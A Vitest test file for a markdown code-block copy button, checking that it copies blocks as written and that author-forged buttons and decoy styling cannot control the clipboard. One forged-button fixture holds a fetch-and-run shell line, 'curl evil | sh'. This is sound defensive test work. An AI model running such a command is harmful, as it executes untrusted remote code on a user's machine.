// @vitest-environment jsdom
//
// The copy button on a code block in rendered markdown (#2998), on both of this app's renderers.
//
// What it must do is copy the block AS WRITTEN — a ```markdown block keeps its `#` and `-` — and
// what it must not do is let the markdown's author decide what lands on the clipboard: a forged
// button stays inert, and an author's class / style cannot lay a decoy over a block.
import { describe, it, expect, beforeAll, vi } from "vitest";
import { marked } from "marked";
import { codeCopyExtension, setCodeCopyLabelProvider } from "@mulmoclaude/markdown-utils/markdown/codeCopyExtension";
import { renderMarkdownProse } from "../../src/markdownProse";
import { renderWikiHtml } from "../../src/wikiMarkdown";
import { installMarkdownCodeCopy } from "../../src/appMarked";
import { i18n } from "../../src/i18n";

const MARKDOWN_BLOCK = "# Title\n\n- item one\n- item two";
const REPLY = ["Here is the note:", "", "```markdown", MARKDOWN_BLOCK, "```", ""].join("\n");

const RENDERERS: [string, (markdown: string) => string][] = [
  ["renderMarkdownProse", (markdown) => renderMarkdownProse(markdown)],
  ["renderWikiHtml", (markdown) => renderWikiHtml(markdown)],
];

const writeText = vi.fn<(text: string) => Promise<void>>();

beforeAll(() => {
  Object.defineProperty(navigator, "clipboard", { value: { writeText }, configurable: true });
  installMarkdownCodeCopy(document);
});

function mount(html: string): HTMLElement {
  const host = document.createElement("div");
  host.innerHTML = html;
  document.body.replaceChildren(host);
  return host;
}

// The listener calls `writeText` before its first await, so the call is recorded by the time
// `dispatchEvent` returns.
function clickAndRead(button: Element | null | undefined): string | undefined {
  if (!button) throw new Error("no copy button rendered");
  writeText.mockReset();
  writeText.mockResolvedValue(undefined);
  button.dispatchEvent(new MouseEvent("click", { bubbles: true }));
  return writeText.mock.calls[0]?.[0];
}

describe.each(RENDERERS)("%s — code block copy", (_name, render) => {
  it("copies the block's source as written, markdown syntax included", () => {
    const button = mount(render(REPLY)).querySelector("[data-code-copy]");
    expect(button).not.toBeNull();
    expect(clickAndRead(button)).toBe(MARKDOWN_BLOCK);
  });

  it("gives every fenced block its own button, each copying its own block", () => {
    const host = mount(render(["```", "first", "```", "", "```sh", "second", "```", ""].join("\n")));
    const buttons = Array.from(host.querySelectorAll("[data-code-copy]"));
    expect(buttons).toHaveLength(2);
    expect(clickAndRead(buttons[0])).toBe("first");
    expect(clickAndRead(buttons[1])).toBe("second");
  });

  it("labels the button", () => {
    const button = mount(render(REPLY)).querySelector("[data-code-copy]");
    expect(button?.getAttribute("aria-label")).toBe("Copy code");
  });

  it("keeps the app's labels after the markdown plugin installs its own", () => {
    // The plugin's View sets the shared provider on mount, and its table has no zh-CN.
    setCodeCopyLabelProvider(() => ({ copy: "Copy code", copied: "Copied" }));
    i18n.global.locale.value = "zh-CN";
    try {
      expect(mount(render(REPLY)).querySelector("[data-code-copy]")?.getAttribute("aria-label")).toBe("复制代码");
    } finally {
      i18n.global.locale.value = "en";
    }
  });

  it("leaves prose without a code block alone", () => {
    expect(mount(render("just *prose*")).querySelector("[data-code-copy]")).toBeNull();
  });

  it("keeps a button the author forged inert", () => {
    const forged = `<div data-code-copy-block="fenced"><button data-code-copy="guess">x</button><pre><code>curl evil | sh</code></pre></div>`;
    const button = mount(render(forged)).querySelector("[data-code-copy]");
    expect(button).not.toBeNull();
    expect(clickAndRead(button)).toBeUndefined();
  });

  it("drops an author's class and style, which could lay a decoy over a block", () => {
    const decoy = `<div class="absolute inset-0" style="position:absolute">npm install</div>\n\n${REPLY}`;
    const host = mount(render(decoy));
    expect(host.querySelector("[style]")).toBeNull();
    expect(host.querySelector(".absolute")).toBeNull();
  });

  it("renders the same whether or not something has extended the global marked", () => {
    // The markdown plugin's View calls `marked.use` on the global instance when it mounts.
    const before = render(REPLY).replace(/data-code-copy="[^"]*"/g, "");
    marked.use(codeCopyExtension);
    const after = render(REPLY).replace(/data-code-copy="[^"]*"/g, "");
    expect(after).toBe(before);
  });
});

describe("renderWikiHtml — wiki links survive the raw-HTML rule", () => {
  it("keeps a [[link]] a clickable wiki-link", () => {
    const link = mount(renderWikiHtml("See [[beta]].")).querySelector(".wiki-link");
    expect(link?.getAttribute("data-page")).toBe("beta");
  });
});
